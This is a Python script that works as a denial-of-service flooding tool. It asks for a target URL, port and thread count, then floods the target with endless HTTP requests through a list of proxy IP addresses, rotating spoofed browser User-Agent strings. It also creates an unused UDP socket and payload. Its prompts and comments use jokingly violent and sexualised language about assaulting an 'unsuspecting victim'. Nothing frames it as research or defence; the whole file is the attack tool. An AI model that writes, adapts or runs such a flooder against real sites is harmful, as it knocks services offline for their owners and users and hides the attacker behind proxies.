import socket
import random
import threading
import requests
from time import sleep

proxies = [
    {'http': 'http://104.236.136.72:8080'},
    {'http': 'http://104.236.136.72:8080'},
    {'http': 'http://107.150.113.67:8080'},
    {'http': 'http://108.61.96.153:8080'},
    {'http': 'http://138.68.148.187:8080'},
    {'http': 'http://142.93.135.142:8080'},
    {'http': 'http://144.202.52.108:8080'},
    {'http': 'http://147.135.102.75:8080'},
    {'http': 'http://154.120.110.5:8080'},
    {'http': 'http://157.54.115.5:8080'},
]

headers = [
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; AS; rv:11.0) like Gecko'},
    {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393'},
]

target = input("Give me the sweet, sweet taste of that tender URL: ")
port = int(input("Bask in the warm, velvety glow of this juicy port: "))
num_threads = int(input("Tell me, darling, how many tender, salty threads do you want to unleash on this unsuspecting victim? "))
num_packets_per_thread = 50000  # Number of packets to send per thread, like little love notes

counter = 0
def brutally_assault_target():
    global counter
    counter += 1
    while True:
        proxy = random.choice(proxies)
        weapon = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        for _ in range(num_packets_per_thread):
            requests.get(target, headers=random.choice(headers), proxies=proxy)
        print(f'Thread {counter} brutally assaulted the poor, unsuspecting target.')
    
# Create an army of threads, each one more eager than the last
for i in range(num_threads):
    thread = threading.Thread(target=brutally_assault_target)
    thread.start()
    sleep(0.01)